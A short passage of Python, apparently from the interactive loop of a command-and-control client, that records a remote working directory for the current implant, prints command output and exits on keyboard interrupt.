                remote_cwd[current_implant] = cwd_val
            if result:
                print(f"\n{result}\n")

    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        break
